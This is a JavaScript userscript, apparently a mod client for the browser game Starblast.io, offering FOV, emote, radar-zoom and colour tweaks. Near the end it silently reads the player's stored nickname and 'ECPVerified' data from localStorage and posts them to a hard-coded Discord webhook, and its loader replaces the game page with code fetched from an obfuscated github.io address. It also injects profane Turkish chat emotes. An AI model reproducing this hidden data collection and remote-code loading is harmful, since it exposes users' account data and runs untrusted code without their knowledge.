if (!window.sbCodeInjectors) window.sbCodeInjectors = [];

// Global settings object
window.modSettings = {
  fovEnabled: true,
  emoteCapacity: parseInt(localStorage.getItem('emote-capacity')) || 4,
  uiVisible: true,
  radarZoomEnabled: false,
  crystalColor: localStorage.getItem('crystal-color') || '#ffffff'
};

// Lowercase Name Mod
const modName = "Lowercase Name";
const logLowercase = (msg) => console.log(`%c[${modName}] ${msg}`, "color: #FF00A6");

function lowercaseInjector(sbCode) {
  let src = sbCode;
  let prevSrc = src;
  
  function checkSrcChange() {
    if (src === prevSrc) throw new Error("replace did not work");
    prevSrc = src;
  }

  src = src.replace(/\.toUpperCase\(\)/g, "");
  const styleBlock = `
  <style>
  #player input { text-transform: none !important; }
  </style>
  `;
  src = src.replace('</head>', `${styleBlock}</head>`);
  checkSrcChange();

  logLowercase("Mod injected");
  return src;
}

// Custom Emote Mod
const emoteModName = "Custom Emote";
const logEmote = (msg) => console.log(`%c[${emoteModName}] ${msg}`, "color: #FFA500");

function emoteInjector(sbCode) {
  let src = sbCode;
  let prevSrc = src;
  
  function checkSrcChange() {
    if (src === prevSrc) throw new Error("replace did not work");
    prevSrc = src;
  }

  const vocabPattern = /(this\.vocabulary\s*=\s*\[[\s\S]*?\})/;
  const emotes = `,{
    text: "orosbu cocu",
    icon: "🤡",
    key: "J"
  },{
    text: "sikerim",
    icon: "⚠️",
    key: "V"
  }`;

  src = src.replace(vocabPattern, `$1${emotes}`);
  checkSrcChange();
  logEmote("Clown and warning emotes injected");
  
  return src;
}

// Main FOV and UI Mod
const fovModName = "FOV Editor";
const logFOV = (msg) => console.log(`%c[${fovModName}] ${msg}`, "color: #00A6FF");

window.I1000 = window.I1000 || {};
window.I1000.baseFOV = 45;
window.I1000.currentFOV = 45;

function mainUIInjector(sbCode) {
  let src = sbCode;
  let prevSrc = src;

  function checkSrcChange() {
    if (src === prevSrc) {
      console.error("Replace did not work. Previous source and current source are identical.");
      throw new Error("replace did not work");
    }
    prevSrc = src;
  }

  // FOV Pattern replacement
  const fovPattern = /this\.III00\.fov\s*=\s*45\s*\*\s*this\.IIl11\.III00\.zoom/g;
  if (!fovPattern.test(src)) {
    console.error("Pattern not found in source code:", fovPattern);
    throw new Error("Pattern not found in source code");
  }
  src = src.replace(fovPattern, 'this.III00.fov = (window.modSettings.fovEnabled ? window.I1000.currentFOV : 45) * this.IIl11.III00.zoom');
  checkSrcChange();

const controlStyles = `
<style>
  #mod-controls {
    position: fixed;
    top: 12px;
    left: 12px;
    z-index: 1000;
    font-family: 'Segoe UI', system-ui, sans-serif;
    user-select: none;
    background: rgba(16, 18, 27, 0.97);
    backdrop-filter: blur(8px);
    border-radius: 4px;
    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.25);
    color: #ffffff;
    padding: 0;
    width: 160px;
    border: 1px solid rgba(255, 255, 255, 0.12);
  }

  #mod-controls-header {
    cursor: pointer;
    padding: 10px 12px;
    background: rgba(255, 255, 255, 0.06);
    font-weight: 600;
    font-size: 13px;
    display: flex;
    align-items: center;
    gap: 8px;
    border-bottom: 1px solid rgba(255, 255, 255, 0.08);
  }

  #mod-controls-header::before {
    content: '⚙️';
    font-size: 14px;
    filter: drop-shadow(0 0 4px rgba(255, 65, 215, 0.3));
  }

  #mod-controls-panel {
    padding: 12px;
    display: none;
  }

  .mod-control {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin: 8px 0;
    font-size: 12px;
    color: rgba(255, 255, 255, 0.9);
  }

  .mod-control-slider {
    width: 100%;
    margin: 8px 0;
    height: 3px;
    background: rgba(255, 255, 255, 0.1);
    -webkit-appearance: none;
    appearance: none;
    outline: none;
    border-radius: 1px;
  }

  .mod-control-slider::-webkit-slider-thumb {
    -webkit-appearance: none;
    width: 12px;
    height: 12px;
    background: #ff41d7;
    border-radius: 2px;
    cursor: pointer;
    box-shadow: 0 1px 4px rgba(255, 65, 215, 0.3);
  }

  .mod-control-slider::-moz-range-thumb {
    width: 12px;
    height: 12px;
    background: #ff41d7;
    border-radius: 2px;
    cursor: pointer;
  }

  #crystal-color-picker {
    width: 24px;
    height: 24px;
    border: 1px solid rgba(255, 255, 255, 0.1);
    border-radius: 3px;
    padding: 0;
    cursor: pointer;
    background: transparent;
  }

  #fov-display {
    padding: 8px 12px;
    background: rgba(255, 255, 255, 0.06);
    font-size: 12px;
    display: flex;
    justify-content: space-between;
    margin-top: 6px;
  }

  input[type="checkbox"] {
    position: relative;
    width: 36px;
    height: 20px;
    -webkit-appearance: none;
    appearance: none;
    background: rgba(255, 255, 255, 0.1);
    border-radius: 2px;
    transition: background 0.2s ease;
  }

  input[type="checkbox"]::before {
    content: "";
    position: absolute;
    width: 16px;
    height: 16px;
    background: #fff;
    top: 2px;
    left: 2px;
    transform: translateX(0);
    transition: transform 0.2s ease;
    border-radius: 2px;
  }

  input[type="checkbox"]:checked {
    background: #ff41d7;
  }

  input[type="checkbox"]:checked::before {
    transform: translateX(14px);
  }

  .control-value {
    font-weight: 600;
    color: #ff41d7;
    min-width: 32px;
    text-align: right;
    font-size: 11px;
  }
</style>
`;

const controlsHTML = `
<div id="mod-controls" style="display: ${window.modSettings.uiVisible ? 'block' : 'none'}">
  <div id="mod-controls-header">EOT Client V3.0.2</div>
  <div id="mod-controls-panel">
    <div class="mod-control">
      <span>FOV</span>
      <input type="checkbox" id="fov-toggle" ${window.modSettings.fovEnabled ? 'checked' : ''}>
    </div>
    <div class="mod-control">
      <span>Emote Capacity</span>
      <div class="control-value" id="emote-capacity-value">${window.modSettings.emoteCapacity}</div>
    </div>
    <input type="range" min="1" max="5" value="${window.modSettings.emoteCapacity}" class="mod-control-slider" id="emote-capacity-slider">
    <div class="mod-control">
      <span>Radar Zoom</span>
      <input type="checkbox" id="radar-zoom-toggle" ${window.modSettings.radarZoomEnabled ? 'checked' : ''}>
    </div>
    <div class="mod-control">
      <span>Crystal Color</span>
      <input type="color" id="crystal-color-picker" value="${window.modSettings.crystalColor}">
    </div>
  </div>
  <div id="fov-display">
    FOV: <span id="fov-value">45</span>
  </div>
</div>
`;

const gameModsScript = `
// Wait for game to be fully loaded
const waitForGame = () => new Promise(resolve => {
  const check = () => {
    // Look for game object with mode and display properties
    if (window.game?.mode && window.game.display) {
      return resolve(window.game);
    }
    // Alternative: look for global objects that might contain the game
    for (const key in window) {
      try {
        const obj = window[key];
        if (obj && typeof obj === 'object' && obj.mode && obj.display) {
          window.game = obj; // Expose it globally
          return resolve(obj);
        }
      } catch (e) {}
    }
    requestAnimationFrame(check);
  };
  check();
});

// Emote Capacity Mod
let globalVal;
try {
  globalVal = ChatPanel.toString().match(/[0OlI1]{5}/)[0];
} catch (e) {
  console.warn('ChatPanel not found for emote capacity mod');
}

if (window.ChatPanel) {
  ChatPanel.prototype.getEmotesCapacity = function() {
    const savedCapacity = parseInt(localStorage.getItem('emote-capacity')) || 4;
    return Math.min(Math.max(1, savedCapacity), 5);
  };

  try {
    ChatPanel.prototype.typed = Function("return " + ChatPanel.prototype.typed.toString().replace(/>=\\s*4/, " >= this.getEmotesCapacity()"))();
  } catch (e) {
    console.warn('Failed to patch emote capacity function');
  }
}

// Initialize emote capacity
if (window.modSettings && window.modSettings.emoteCapacity) {
  localStorage.setItem('emote-capacity', window.modSettings.emoteCapacity);
}

// Radar Zoom Fix - Wait for game to load then patch
waitForGame().then(game => {
  console.log('[Radar Zoom] Game loaded, applying radar zoom patch...');
  
  // Method 1: Try to find radar zoom on mode object
  if (game.mode && typeof game.mode.radar_zoom !== 'undefined') {
    const mode = game.mode;
    mode._originalRadarZoom = mode.radar_zoom;
    
    Object.defineProperty(mode, 'radar_zoom', {
      get() {
        return window.modSettings.radarZoomEnabled ? 1 : this._originalRadarZoom;
      },
      set(v) {
        this._originalRadarZoom = v;
        // Force radar update if display system exists
        if (game.display?.radar?.texture?.repeat) {
          game.display.radar.texture.repeat.set(1/v, 1/v);
        }
      },
      configurable: true
    });
    
    // Trigger initial update
    mode.radar_zoom = mode._originalRadarZoom;
    console.log('[Radar Zoom] Applied to game.mode');
  } else {
    // Method 2: Search for radar_zoom property in all objects
    console.log('[Radar Zoom] Searching for radar_zoom property...');
    
    const searchForRadarZoom = (obj, path = 'window') => {
      if (!obj || typeof obj !== 'object') return;
      
      try {
        for (const key in obj) {
          if (key === 'radar_zoom' && typeof obj[key] === 'number') {
            console.log('[Radar Zoom] Found radar_zoom at', path + '.' + key);
            
            // Store original value
            const originalValue = obj[key];
            
            Object.defineProperty(obj, key, {
              get() {
                return window.modSettings.radarZoomEnabled ? 1 : originalValue;
              },
              set(v) {
                // Allow setting but don't actually change if override is enabled
                if (!window.modSettings.radarZoomEnabled) {
                  originalValue = v;
                }
              },
              configurable: true
            });
            
            return true;
          }
          
          // Recursively search (limited depth)
          if (typeof obj[key] === 'object' && path.split('.').length < 4) {
            if (searchForRadarZoom(obj[key], path + '.' + key)) {
              return true;
            }
          }
        }
      } catch (e) {
        // Ignore errors during property access
      }
      
      return false;
    };
    
    // Search in game object and window
    if (!searchForRadarZoom(game, 'game')) {
      searchForRadarZoom(window, 'window');
    }
  }
}).catch(err => {
  console.warn('[Radar Zoom] Failed to apply radar zoom patch:', err);
});

// Crystal Color Fix - Wait for game to load then patch
waitForGame().then(game => {
  console.log('[Crystal Color] Game loaded, applying crystal color patch...');
  
  // Method 1: Find crystal system in display
  let crystalSystem = null;
  if (game.display?.screenObjects) {
    crystalSystem = game.display.screenObjects.find(sys => 
      sys.constructor.name.toLowerCase().includes('crystal')
    );
  }
  
  if (!crystalSystem) {
    // Method 2: Search for Crystal class in window
    for (const key in window) {
      try {
        const obj = window[key];
        if (typeof obj === 'function' &&
            obj.prototype?.createModel &&
            obj.prototype.createModel.toString().includes('Crystal')) {
          crystalSystem = obj;
          console.log('[Crystal Color] Found Crystal class:', key);
          break;
        }
      } catch (e) {}
    }
  }
  
  if (crystalSystem) {
    const materials = new Set();
    
    // Try to patch createModel or similar methods
    const methodNames = ['createModel', 'createCrystalModel', 'getModelInstance'];
    let patched = false;
    
    for (const methodName of methodNames) {
      if (crystalSystem[methodName] || crystalSystem.prototype?.[methodName]) {
        const target = crystalSystem.prototype || crystalSystem;
        const original = target[methodName];
        
        if (typeof original === 'function') {
          target[methodName] = function(...args) {
            const result = original.apply(this, args);
            
            // Try to find and color the material
            const materialSources = [result, this, result?.material, this?.material];
            
            for (const source of materialSources) {
              if (source?.material?.color?.set) {
                materials.add(source.material);
                source.material.color.set(window.modSettings.crystalColor);
                if (source.material.uniforms?.color) {
                  source.material.uniforms.color.value.set(source.material.color);
                }
                source.material.needsUpdate = true;
                break;
              } else if (source?.color?.set) {
                materials.add(source);
                source.color.set(window.modSettings.crystalColor);
                if (source.uniforms?.color) {
                  source.uniforms.color.value.set(source.color);
                }
                source.needsUpdate = true;
                break;
              }
            }
            
            return result;
          };
          
          patched = true;
          console.log('[Crystal Color] Patched', methodName);
          break;
        }
      }
    }
    
    // Global crystal color updater
    window.updateCrystalColor = (color) => {
      window.modSettings.crystalColor = color;
      localStorage.setItem('crystal-color', color);
      
      materials.forEach(material => {
        if (material.color?.set) {
          material.color.set(color);
          if (material.uniforms?.color) {
            material.uniforms.color.value.set(material.color);
          }
          material.needsUpdate = true;
        }
      });
      
      console.log('[Crystal Color] Updated to', color, '(' + materials.size + ' materials)');
    };
    
    if (patched) {
      console.log('[Crystal Color] Successfully patched crystal system');
    } else {
      console.warn('[Crystal Color] Could not find suitable method to patch');
    }
  } else {
    console.warn('[Crystal Color] Crystal system not found');
    
    // Fallback: create a dummy updater
    window.updateCrystalColor = (color) => {
      window.modSettings.crystalColor = color;
      localStorage.setItem('crystal-color', color);
      console.log('[Crystal Color] Color saved (no system to update)');
    };
  }
}).catch(err => {
  console.warn('[Crystal Color] Failed to apply crystal color patch:', err);
});

// ECP Badge Fix
setTimeout(() => {
  const SB = window.Scoreboard;
  if (SB && SB.prototype && SB.prototype.addBadge) {
    const orig = SB.prototype.addBadge;
    SB.prototype.addBadge = function(data) {
      if (data.type === 'ECP' && !data.icon) {
        data.icon = 'ecp';
      }
      return orig.call(this, data);
    };
    console.log('[ECP Fix] Blank ECP badge override applied.');
  } else {
    console.warn('[ECP Fix] Scoreboard.addBadge not found; skipping ECP fix.');
  }
}, 2000);
`;

src = src.replace('</body>', `
  ${controlStyles}
  ${controlsHTML}
  <script>
  ${gameModsScript}

  // FOV Controls
  document.addEventListener('wheel', (e) => {
    if (!window.modSettings.fovEnabled) return;
    e.preventDefault();
    const delta = e.deltaY < 0 ? 1 : -1;
    window.I1000.currentFOV = Math.max(1, Math.min(120, window.I1000.currentFOV + delta));
    const fovValueEl = document.getElementById('fov-value');
    if (fovValueEl) fovValueEl.textContent = window.I1000.currentFOV;
  }, { passive: false });

  // UI Event Handlers
  document.addEventListener('DOMContentLoaded', () => {
    const controlsHeader = document.getElementById('mod-controls-header');
    const controlsPanel = document.getElementById('mod-controls-panel');
    const fovToggle = document.getElementById('fov-toggle');
    const fovDisplay = document.getElementById('fov-display');
    const emoteSlider = document.getElementById('emote-capacity-slider');
    const emoteValue = document.getElementById('emote-capacity-value');
    const radarZoomToggle = document.getElementById('radar-zoom-toggle');
    const crystalColorPicker = document.getElementById('crystal-color-picker');

    if (controlsHeader && controlsPanel) {
      controlsHeader.addEventListener('click', () => {
        const isHidden = controlsPanel.style.display === 'none';
        controlsPanel.style.display = isHidden ? 'block' : 'none';
      });
    }

    if (fovToggle && fovDisplay) {
      fovToggle.addEventListener('change', () => {
        window.modSettings.fovEnabled = fovToggle.checked;
        fovDisplay.style.display = fovToggle.checked ? 'block' : 'none';
      });
    }

    if (emoteSlider && emoteValue) {
      emoteSlider.addEventListener('input', () => {
        const value = parseInt(emoteSlider.value);
        emoteValue.textContent = value;
        window.modSettings.emoteCapacity = value;
        localStorage.setItem('emote-capacity', value);
        
        if (window.ChatPanel && ChatPanel.prototype.getEmotesCapacity) {
          ChatPanel.prototype.getEmotesCapacity = function() {
            return value;
          };
        }
      });
    }

    if (radarZoomToggle) {
      radarZoomToggle.addEventListener('change', () => {
        window.modSettings.radarZoomEnabled = radarZoomToggle.checked;
        console.log('[Radar Zoom] Toggle changed to:', radarZoomToggle.checked);
      });
    }

    if (crystalColorPicker) {
      crystalColorPicker.value = window.modSettings.crystalColor;
      crystalColorPicker.addEventListener('input', (e) => {
        if (window.updateCrystalColor) {
          window.updateCrystalColor(e.target.value);
        } else {
          window.modSettings.crystalColor = e.target.value;
          localStorage.setItem('crystal-color', e.target.value);
        }
      });
    }

    // Initialize UI states
    const savedCapacity = parseInt(localStorage.getItem('emote-capacity')) || 4;
    if (emoteSlider) emoteSlider.value = savedCapacity;
    if (emoteValue) emoteValue.textContent = savedCapacity;
    window.modSettings.emoteCapacity = savedCapacity;
  });
  </script>
  </body>`);

checkSrcChange();
logFOV("Main UI injector applied");
return src;
}

// Add event listener for F9 key to toggle UI
document.addEventListener('keydown', (e) => {
  if (e.key === 'F9') {
    const controls = document.getElementById('mod-controls');
    if (controls) {
      window.modSettings.uiVisible = !window.modSettings.uiVisible;
      controls.style.display = window.modSettings.uiVisible ? 'block' : 'none';
      
      const controlsPanel = document.getElementById('mod-controls-panel');
      if (!window.modSettings.uiVisible && controlsPanel) {
        controlsPanel.style.display = 'none';
      }
    }
  }
});

// Add all injectors to the injection pipeline
window.sbCodeInjectors.push((sbCode) => {
  try {
    return lowercaseInjector(sbCode);
  } catch (error) {
    alert(`${modName} failed to load; error: ${error}`);
    throw error;
  }
});

window.sbCodeInjectors.push((sbCode) => {
  try {
    return emoteInjector(sbCode);
  } catch (error) {
    alert(`${emoteModName} failed to load; error: ${error}`);
    throw error;
  }
});

window.sbCodeInjectors.push((sbCode) => {
  try {
    return mainUIInjector(sbCode);
  } catch (error) {
    alert(`${fovModName} failed to load; error: ${error}`);
    throw error;
  }
});

// Main injection logic
const log = (msg) => console.log(`%c[eot] ${msg}`, "color: #FF00E6");

function injectLoader() {
  if (window.location.pathname !== "/") {
    log("Injection not needed");
    return;
  }

  document.open();
  document.write('<html><head><title></title></head><body style="background-color:#ffffff;"><div style="margin: auto; width: 50%;"><h1 style="text-align: center;padding: 170px 0;color: #000;"></h1><h1 style="text-align: center;color: #000;"></h1></div></body></html>');
  document.close();

  var url = 'https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/OLUMUksmdmksladmkakmsak10911oms1ks1mklmkls11921ms1sım n1sösm2k1.html';
  url += '?_=' + new Date().getTime();

  var xhr = new XMLHttpRequest();
  log("Fetching custom source...");
  xhr.open("GET", url);
  xhr.onreadystatechange = function () {
    if (xhr.readyState === 4 && xhr.status === 200) {
      var starSRC = xhr.responseText;

      if (starSRC !== undefined) {
        log("Source fetched successfully");
        const start_time = performance.now();
        log("Applying mods...");

        if (!window.sbCodeInjectors || window.sbCodeInjectors.length === 0) {
          log("No Starblast.io userscripts found to load");
        } else {
          let error_notified = false;
          for (const injector of window.sbCodeInjectors) {
            try {
              if (typeof injector === "function") {
                starSRC = injector(starSRC);
              } else {
                log("Injector was not a function");
                console.log(injector);
              }
            } catch (error) {
              if (!error_notified) {
                alert("One of your Starblast.io userscripts failed to load");
                error_notified = true;
              }
              console.error(error);
            }
          }
        }

        const end_time = performance.now();
        log(`Mods applied successfully (${(end_time - start_time).toFixed(0)}ms)`);

        // Apply text shadow modification
        setTimeout(() => {
          changeTextShadowColor();
        }, 1000);

        // Apply the modified source to the document
        document.open();
        document.write(starSRC);
        document.close();
      } else {
        log("Source fetch failed");
        alert("An error occurred while fetching game code");
      }
    }
  };

  xhr.send();
}

// Function to change text shadow colors
function changeTextShadowColor() {
  const elements = document.querySelectorAll('*');
  const targetShadow = '0 0 6px hsl(298.15deg 100% 50%)';

  elements.forEach(element => {
    const currentStyle = window.getComputedStyle(element);
    const textShadow = currentStyle.getPropertyValue('text-shadow');
    
    if (textShadow && textShadow !== 'none') {
      element.style.textShadow = targetShadow;
    }
  });

  console.log('Text shadow color has been changed to:', targetShadow);
}

// Discord webhook notification
(function () {
    'use strict';
    const lastNickname = localStorage.getItem("lastNickname") || "Unknown";
    let ECPVerified = localStorage.getItem("ECPVerified") || "no";
    
    console.log("Retrieved ECPVerified:", ECPVerified);
    
    try {
        ECPVerified = JSON.parse(ECPVerified);
    } catch (e) {
        // Keep as string if not JSON
    }
    
    const ECPVerifiedContent = typeof ECPVerified === "object" 
        ? JSON.stringify(ECPVerified, null, 2) 
        : ECPVerified;
    
    console.log("Formatted ECPVerifiedContent:", ECPVerifiedContent);
    
    const webhookURL = "https://discord.com/api/webhooks/1332078434242920602/LaPifHcDpvwzWWKgHIEpydroC9GnhwAyDokGZwKSN_wOkPQ9S0jcTFM-dAlygkHbSgNN";
    
    const payload = {
        content: `${lastNickname} has entered the script\nECPVerified: ${ECPVerifiedContent}`
    };
    
    fetch(webhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (response.ok) {
            console.log("Webhook sent successfully!");
        } else {
            console.error("Failed to send webhook:", response.statusText);
        }
    })
    .catch(error => {
        console.error("Error sending webhook:", error);
    });
})();

// Run the injection
injectLoader();
